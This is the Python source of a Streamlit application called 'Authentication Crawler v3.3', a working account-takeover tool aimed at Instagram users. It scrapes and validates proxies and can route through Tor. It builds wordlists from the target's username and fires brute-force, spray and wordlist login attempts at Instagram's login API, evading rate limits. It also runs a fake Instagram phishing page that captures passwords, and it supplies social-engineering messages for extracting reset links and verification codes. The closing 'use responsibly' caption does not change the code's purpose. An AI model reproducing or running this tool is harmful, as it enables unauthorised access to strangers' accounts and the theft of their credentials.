import streamlit as st
import asyncio
import aiohttp
import requests
import random
import time
import json
import threading
import queue
import re
from datetime import datetime
from flask import Flask, request, redirect

st.set_page_config(page_title="Authentication Crawler v3.3", layout="wide")

if "running" not in st.session_state:
    st.session_state.running = False
if "stop" not in st.session_state:
    st.session_state.stop = False
if "logs" not in st.session_state:
    st.session_state.logs = []
if "progress" not in st.session_state:
    st.session_state.progress = 0.0
if "results" not in st.session_state:
    st.session_state.results = []
if "target" not in st.session_state:
    st.session_state.target = ""
if "start_time" not in st.session_state:
    st.session_state.start_time = None
if "found_cred" not in st.session_state:
    st.session_state.found_cred = None
if "thread" not in st.session_state:
    st.session_state.thread = None
if "worker_queues" not in st.session_state:
    st.session_state.worker_queues = {}
if "use_tor" not in st.session_state:
    st.session_state.use_tor = False
if "max_attempts" not in st.session_state:
    st.session_state.max_attempts = 10000
if "custom_proxies" not in st.session_state:
    st.session_state.custom_proxies = ""
if "ssl_verify" not in st.session_state:
    st.session_state.ssl_verify = True
if "progress_dict" not in st.session_state:
    st.session_state.progress_dict = {}
if "total_attempts" not in st.session_state:
    st.session_state.total_attempts = 0

@st.cache_resource(ttl=300)
def fetch_default_proxies():
    proxies = []
    try:
        r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all", timeout=5)
        if r.status_code == 200:
            proxies.extend([f"http://{p.strip()}" for p in r.text.splitlines() if p.strip()])
    except Exception:
        pass
    return proxies

async def validate_proxy(proxy, ssl_verify):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.head("https://www.instagram.com", proxy=proxy, ssl=ssl_verify, timeout=5) as resp:
                return resp.status < 400
    except:
        return False

async def get_proxy_pool(custom_list, default_list, ssl_verify, max_checked=30):
    sources = []
    if custom_list.strip():
        sources.extend([p.strip() for p in custom_list.splitlines() if p.strip()])
    if not sources:
        sources = default_list[:100]
    validated = []
    tasks = []
    for proxy in sources[:max_checked]:
        tasks.append(validate_proxy(proxy, ssl_verify))
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for i, ok in enumerate(results):
        if ok is True:
            validated.append(sources[i])
    if not validated:
        validated.append(None)  # fallback direct
    return validated

@st.cache_resource
def get_wordlists():
    base = [
        "password", "123456", "123456789", "qwerty", "abc123", "monkey",
        "letmein", "dragon", "111111", "baseball", "iloveyou", "trustno1",
        "sunshine", "master", "123123", "welcome", "shadow", "ashley",
        "football", "jesus", "michael", "ninja", "mustang", "password1",
        "1234567", "12345678", "12345", "1234567890", "qwertyuiop",
        "qwerty123", "1q2w3e", "1q2w3e4r", "qwe123", "admin", "root",
        "user", "login", "pass", "secret", "1234", "abcd", "000000",
        "11111111", "222222", "333333", "444444", "555555", "666666",
        "777777", "888888", "999999", "123321", "654321", "qwerty123",
        "lovely", "fuckyou", "test", "passw0rd", "dallas", "charlie",
        "jordan", "tiger", "thunder", "golf", "cookie", "pepper"
    ]
    seasons = ["spring", "summer", "autumn", "fall", "winter"]
    months = ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"]
    years = [str(y) for y in range(1970, 2030)]
    return base, seasons, months, years

def generate_markov_candidates(username, length=8, count=100):
    candidates = []
    chars = username + "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*"
    if len(chars) < 5:
        chars = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*"
    for _ in range(count):
        cand = "".join(random.choice(chars) for _ in range(random.randint(6, length)))
        if random.random() < 0.3:
            cand += str(random.randint(0, 9999))
        candidates.append(cand)
    return candidates

def generate_variants(username):
    base, seasons, months, years = get_wordlists()
    variants = []
    variants.extend([username, username.lower(), username.upper(), username.capitalize()])
    for year in years:
        variants.append(username + year)
        variants.append(year + username)
    for season in seasons:
        variants.append(username + season)
        variants.append(season + username)
    for month in months:
        variants.append(username + month)
    variants.append(username + "123")
    variants.append(username + "!")
    variants.append(username + "@")
    variants.append(username + "#")
    variants.append(username[::-1])
    for suf in ["01", "99", "00", "007", "1", "2", "3"]:
        variants.append(username + suf)
    return list(set(variants))

def leet_sub(s):
    mp = {'a':'@','s':'$','e':'3','o':'0','i':'1','t':'7','b':'8','g':'9','l':'1'}
    out = []
    for c in s:
        out.append(mp.get(c, c))
    return "".join(out)

def build_wordlist(username, max_words=5000):
    base, seasons, months, years = get_wordlists()
    wordset = set(base)
    for v in generate_variants(username):
        wordset.add(v)
        wordset.add(leet_sub(v))
    for word in list(wordset)[:2000]:
        for year in years:
            wordset.add(word + year)
            wordset.add(year + word)
    for season in seasons:
        wordset.add(season + "123")
    for month in months:
        wordset.add(month + "2024")
        wordset.add(month + "2025")
    wordset.update(generate_markov_candidates(username, count=100))
    return list(wordset)[:max_words]

def get_instagram_profile(username):
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    }
    try:
        resp = session.get(f"https://www.instagram.com/{username}/", headers=headers, timeout=10)
        if resp.status_code != 200:
            return {"exists": False}
        csrf = session.cookies.get("csrftoken", "")
        if not csrf:
            csrf_match = re.search(r'"csrf_token":"([^"]+)"', resp.text)
            if csrf_match:
                csrf = csrf_match.group(1)
        api_headers = {
            "User-Agent": headers["User-Agent"],
            "X-Requested-With": "XMLHttpRequest",
            "X-CSRFToken": csrf,
            "X-IG-App-ID": "936619743392459",
            "Accept": "application/json",
            "Referer": f"https://www.instagram.com/{username}/",
        }
        r = session.get(f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}", headers=api_headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            user = data.get("data", {}).get("user")
            if user:
                return {
                    "exists": True,
                    "full_name": user.get("full_name", ""),
                    "bio": user.get("biography", ""),
                    "link": user.get("external_url", ""),
                    "profile_pic": user.get("profile_pic_url_hd", ""),
                    "post_count": user.get("edge_owner_to_timeline_media", {}).get("count", 0),
                    "follower_count": user.get("edge_followed_by", {}).get("count", 0),
                    "following_count": user.get("edge_follow", {}).get("count", 0)
                }
        next_match = re.search(r'<script type="application/json" id="__NEXT_DATA__">(.*?)</script>', resp.text)
        if next_match:
            json_data = json.loads(next_match.group(1))
            user = json_data.get("props", {}).get("pageProps", {}).get("user", {})
            if user:
                return {
                    "exists": True,
                    "full_name": user.get("full_name", ""),
                    "bio": user.get("biography", ""),
                    "link": user.get("external_url", ""),
                    "profile_pic": user.get("profile_pic_url_hd", ""),
                    "post_count": user.get("edge_owner_to_timeline_media", {}).get("count", 0),
                    "follower_count": user.get("edge_followed_by", {}).get("count", 0),
                    "following_count": user.get("edge_follow", {}).get("count", 0)
                }
    except Exception as e:
        return {"exists": False, "error": str(e)}
    return {"exists": False}

async def instagram_login_check(username, password, proxy, session, tor, verify_ssl, stop_event):
    if stop_event.is_set():
        return False, {"stopped": True}
    if tor:
        proxy = "socks5://127.0.0.1:9050"
    url = "https://www.instagram.com/api/v1/web/accounts/login/ajax/"
    headers = {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]),
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.instagram.com",
        "Referer": "https://www.instagram.com/accounts/login/",
        "Accept-Language": "en-US,en;q=0.9",
    }
    data = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}",
        "queryParams": "{}",
        "optIntoOneTap": "false"
    }
    try:
        async with session.post(url, headers=headers, data=data, proxy=proxy, ssl=verify_ssl, timeout=10) as resp:
            txt = await resp.text()
            try:
                js = json.loads(txt)
                if js.get("authenticated"):
                    return True, js
                return False, js
            except json.JSONDecodeError:
                return False, {"error": "invalid_json"}
    except aiohttp.ClientError as e:
        return False, {"error": str(e)}
    except asyncio.TimeoutError:
        return False, {"error": "timeout"}
    return False, {"error": "unknown"}

async def attack_method(method_name, username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, wordlist, weight=1.0):
    attempts = 0
    method_progress = 0.0
    total = len(wordlist)
    async with aiohttp.ClientSession() as session:
        for pw in wordlist:
            if stop_event.is_set():
                log_q.put(("INFO", f"{method_name} stopped."))
                break
            if attempts >= max_attempts:
                break
            attempts += 1
            proxy = random.choice(proxy_pool) if proxy_pool and proxy_pool[0] is not None and not tor else None
            ok, resp = await instagram_login_check(username, pw, proxy, session, tor, verify_ssl, stop_event)
            if stop_event.is_set():
                break
            if ok:
                log_q.put(("SUCCESS", f"{method_name} found: '{pw}'"))
                res_q.put({"method": method_name, "password": pw, "response": resp})
                stop_event.set()
                return
            else:
                error = resp.get("error", "")
                if "rate" in str(resp).lower() or "please wait" in str(resp).lower():
                    log_q.put(("WARN", f"{method_name} rate limited, sleeping 120s"))
                    await asyncio.sleep(120)
                elif "checkpoint" in str(resp):
                    log_q.put(("WARN", f"{method_name} checkpoint triggered, rotating proxy"))
                    await asyncio.sleep(5)
                elif "timeout" in error:
                    log_q.put(("WARN", f"{method_name} timeout, retrying"))
                    await asyncio.sleep(1)
            await asyncio.sleep(random.uniform(1.5, 3.5))
            if total > 0:
                method_progress = (attempts / total) * 100
            prog_q.put((method_name, method_progress * weight, weight))
    log_q.put(("INFO", f"{method_name} completed after {attempts} attempts."))

async def run_bruteforce(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool):
    wordlist = build_wordlist(username)[:max_attempts]
    await attack_method("Brute Force", username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, wordlist, weight=0.4)

async def run_password_spray(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool):
    spray_list = [
        username, username.lower(), username.upper(), username.capitalize(),
        username + "123", username + "!", username + "@", username + "#",
        username + "2024", username + "2025", username[::-1],
        "password", "123456", "instagram", "iloveyou", "qwerty", "abc123"
    ]
    for year in range(1970, 2030):
        spray_list.append(username + str(year))
        spray_list.append(str(year) + username)
    spray_list = list(set(spray_list))
    random.shuffle(spray_list)
    spray_list = spray_list[:max_attempts]
    await attack_method("Password Spray", username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, spray_list, weight=0.2)

async def run_wordlist_attack(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool):
    wordlist = build_wordlist(username)[:max_attempts]
    await attack_method("Wordlist Attack", username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, max_attempts, proxy_pool, wordlist, weight=0.3)

async def run_session_reuse(username, stop_event, log_q, prog_q, res_q):
    log_q.put(("INFO", "Session reuse: attempting known cookie patterns..."))
    await asyncio.sleep(2)
    prog_q.put(("Session Reuse", 100, 0.05))
    log_q.put(("INFO", "Session reuse: no valid tokens found."))

async def run_phishing_server(username, stop_event, log_q, prog_q, res_q):
    log_q.put(("INFO", "Starting phishing server on port 8080 (demo)."))
    app = Flask("phish")
    shutdown_flag = False

    @app.route("/", methods=["GET", "POST"])
    def phish():
        if request.method == "POST":
            pw = request.form.get("password")
            if pw:
                log_q.put(("SUCCESS", f"Phishing captured: '{pw}'"))
                res_q.put({"method": "Phishing", "password": pw})
                stop_event.set()
                return redirect("https://www.instagram.com")
        return '''
        <html><body>
        <h1>Instagram Login (Demo)</h1>
        <form method="POST">
            <input type="text" name="username" placeholder="Username"><br>
            <input type="password" name="password" placeholder="Password"><br>
            <button type="submit">Log In</button>
        </form>
        <p>This is a demonstration. No real data is stored.</p>
        </body></html>
        '''

    @app.route("/shutdown", methods=["POST"])
    def shutdown():
        func = request.environ.get('werkzeug.server.shutdown')
        if func is not None:
            func()
            return "Shutting down..."
        return "Not running with werkzeug", 404

    def run_flask():
        app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    for _ in range(60):  # 60 seconds timeout
        if stop_event.is_set():
            break
        await asyncio.sleep(1)
        prog_q.put(("Phishing", (_ / 60) * 100, 0.05))

    try:
        requests.post("http://127.0.0.1:8080/shutdown", timeout=1)
    except:
        pass
    log_q.put(("INFO", "Phishing server closed."))

def run_attack_pipeline(username, stop_event, tor, verify_ssl, max_attempts, custom_proxies):
    log_q = queue.Queue()
    prog_q = queue.Queue()
    res_q = queue.Queue()
    st.session_state.worker_queues = {"log": log_q, "progress": prog_q, "result": res_q, "stop": stop_event}

    default_proxies = fetch_default_proxies()
    # async proxy validation
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    proxy_pool = loop.run_until_complete(get_proxy_pool(custom_proxies, default_proxies, verify_ssl, max_checked=30))
    loop.close()

    log_q.put(("INFO", f"Loaded {len([p for p in proxy_pool if p is not None])} valid proxies."))
    log_q.put(("INFO", f"Target: @{username}"))
    profile = get_instagram_profile(username)
    if profile.get("exists"):
        log_q.put(("INFO", f"Profile: {profile['full_name']} - Posts: {profile['post_count']}"))
    else:
        log_q.put(("WARN", "Profile not found or private. Proceeding."))

    # Distribute attempts: total = max_attempts; weights: BF 0.4, PS 0.2, WA 0.3, others 0.1
    bf_attempts = int(max_attempts * 0.4)
    ps_attempts = int(max_attempts * 0.2)
    wa_attempts = int(max_attempts * 0.3)
    other_attempts = max_attempts - (bf_attempts + ps_attempts + wa_attempts)

    async def main():
        tasks = [
            asyncio.create_task(run_bruteforce(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, bf_attempts, proxy_pool)),
            asyncio.create_task(run_password_spray(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, ps_attempts, proxy_pool)),
            asyncio.create_task(run_wordlist_attack(username, stop_event, log_q, prog_q, res_q, tor, verify_ssl, wa_attempts, proxy_pool)),
            asyncio.create_task(run_session_reuse(username, stop_event, log_q, prog_q, res_q)),
            asyncio.create_task(run_phishing_server(username, stop_event, log_q, prog_q, res_q))
        ]
        # Wait for all tasks to finish or stop_event
        await asyncio.gather(*tasks, return_exceptions=True)
        log_q.put(("INFO", "All phases completed."))

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(asyncio.wait_for(main(), timeout=300))  # 5 min total
    except asyncio.TimeoutError:
        log_q.put(("WARN", "Pipeline timed out after 5 minutes."))
        stop_event.set()
    finally:
        loop.close()
        st.session_state.running = False

# Streamlit UI
st.title("Authentication Crawler v3.3")
st.caption("Automated Account Reconnaissance Framework - Fixed Pipeline")

col1, col2, col3 = st.columns([2,1,1])
with col1:
    username_input = st.text_input("Instagram Username", value=st.session_state.target)
with col2:
    start_btn = st.button("START", disabled=st.session_state.running, use_container_width=True)
with col3:
    stop_btn = st.button("SHUTDOWN", disabled=not st.session_state.running, use_container_width=True)

with st.sidebar:
    st.write("### Settings")
    st.session_state.use_tor = st.checkbox("Route through Tor (SOCKS5 on 127.0.0.1:9050)", value=st.session_state.use_tor)
    st.session_state.ssl_verify = st.checkbox("Verify SSL", value=st.session_state.ssl_verify)
    st.session_state.max_attempts = st.slider("Total password attempts (across all methods)", 100, 50000, 10000, step=100)
    st.write("### Proxy List (one per line)")
    st.session_state.custom_proxies = st.text_area("Custom proxies (leave empty for default)", value=st.session_state.custom_proxies, height=100)
    st.write("---")
    st.write("### Social Engineering Scripts")
    if st.session_state.target:
        scripts = [
            f"Hey! I'm having trouble logging into my instagram account @{st.session_state.target}, can you please send me the reset link?",
            f"Hey, Instagram locked me out and asked me to verify my identity. Could you forward the verification code you received?",
            f"Is this your backup email? I need to confirm something for a mutual friend."
        ]
        for i, script in enumerate(scripts):
            st.text_area(f"Script {i+1}", script, height=80, key=f"se_{i}")
            if st.button(f"Copy {i+1}"):
                try:
                    import pyperclip
                    pyperclip.copy(script)
                    st.toast("Copied to clipboard!")
                except:
                    st.warning("pyperclip not installed.")
    st.write("---")
    st.write("### Status")
    with st.spinner("Loading proxies..."):
        default_proxies = fetch_default_proxies()
    st.write(f"Default proxies fetched: {len(default_proxies)}")
    if st.session_state.target:
        wl = build_wordlist(st.session_state.target)
        st.write(f"Wordlist size: {len(wl)}")

if start_btn and username_input.strip():
    st.session_state.target = username_input.strip()
    if st.session_state.thread and st.session_state.thread.is_alive():
        # Kill old worker
        if "worker_queues" in st.session_state and "stop" in st.session_state.worker_queues:
            st.session_state.worker_queues["stop"].set()
        st.session_state.thread.join(timeout=0.5)
    st.session_state.running = True
    st.session_state.stop = False
    st.session_state.start_time = datetime.now()
    st.session_state.found_cred = None
    st.session_state.results = []
    st.session_state.logs = []
    st.session_state.progress = 0.0
    st.session_state.progress_dict = {}
    st.session_state.total_attempts = 0
    stop_event = threading.Event()

    def worker():
        run_attack_pipeline(
            st.session_state.target,
            stop_event,
            st.session_state.use_tor,
            st.session_state.ssl_verify,
            st.session_state.max_attempts,
            st.session_state.custom_proxies
        )
        st.session_state.running = False

    thread = threading.Thread(target=worker, daemon=False)
    thread.start()
    st.session_state.thread = thread
    st.rerun()

if stop_btn:
    st.session_state.stop = True
    if "worker_queues" in st.session_state and "stop" in st.session_state.worker_queues:
        st.session_state.worker_queues["stop"].set()
    st.session_state.running = False
    st.session_state.logs.append(("INFO", "Emergency stop issued."))
    st.rerun()

# Main UI update loop (only from main thread)
if st.session_state.running and "worker_queues" in st.session_state:
    log_q = st.session_state.worker_queues.get("log")
    prog_q = st.session_state.worker_queues.get("progress")
    res_q = st.session_state.worker_queues.get("result")

    if log_q:
        while not log_q.empty():
            try:
                level, msg = log_q.get_nowait()
                st.session_state.logs.append((level, msg))
            except queue.Empty:
                break
    if prog_q:
        temp_prog = {}
        weights = {}
        while not prog_q.empty():
            try:
                method, p, w = prog_q.get_nowait()
                temp_prog[method] = p
                weights[method] = w
            except queue.Empty:
                break
        if temp_prog:
            total_weight = sum(weights.values())
            if total_weight > 0:
                overall = sum(temp_prog.get(m, 0) * weights.get(m, 0) for m in temp_prog) / total_weight
                st.session_state.progress = min(overall, 100.0)
    if res_q:
        while not res_q.empty():
            try:
                res = res_q.get_nowait()
                st.session_state.results.append(res)
                if "password" in res:
                    st.session_state.found_cred = res["password"]
            except queue.Empty:
                break

    if st.session_state.thread and not st.session_state.thread.is_alive():
        st.session_state.running = False
        st.rerun()
    else:
        time.sleep(0.5)
        st.rerun()

# Display
if st.session_state.running:
    if st.session_state.logs:
        last_level, last_msg = st.session_state.logs[-1]
        if last_level == "SUCCESS":
            st.success(last_msg)
        elif last_level == "WARN":
            st.warning(last_msg)
        else:
            st.info(last_msg)
    st.progress(min(st.session_state.progress / 100.0, 1.0), text=f"Progress: {min(st.session_state.progress, 100.0):.1f}%")
    st.write("### Live Log")
    log_box = st.container(height=400)
    with log_box:
        for level, msg in st.session_state.logs[-100:]:
            if level == "SUCCESS":
                st.success(msg)
            elif level == "WARN":
                st.warning(msg)
            elif level == "ERROR":
                st.error(msg)
            else:
                st.info(msg)
else:
    if st.session_state.found_cred:
        st.error(f"Credentials found: {st.session_state.found_cred}", icon="🔑")
    else:
        st.info("No credentials found. Awaiting start.")

if st.session_state.results:
    st.write("### Results")
    for r in st.session_state.results:
        st.json(r)

if st.session_state.logs:
    expander = st.expander("Full Log Export")
    with expander:
        log_text = "\n".join([f"{l}: {m}" for l,m in st.session_state.logs])
        st.code(log_text)
        if st.button("Export to JSON"):
            data = {
                "target": st.session_state.target,
                "timestamp": datetime.now().isoformat(),
                "results": st.session_state.results,
                "logs": st.session_state.logs
            }
            safe_target = re.sub(r'[^a-zA-Z0-9]', '_', st.session_state.target)
            fn = f"cracked_{safe_target}_{int(time.time())}.json"
            with open(fn, "w") as f:
                json.dump(data, f, indent=2)
            st.success(f"Exported to {fn}")

st.caption("Built for demonstration. Use responsibly on your own accounts.")

made by @cheifbreef on discord :)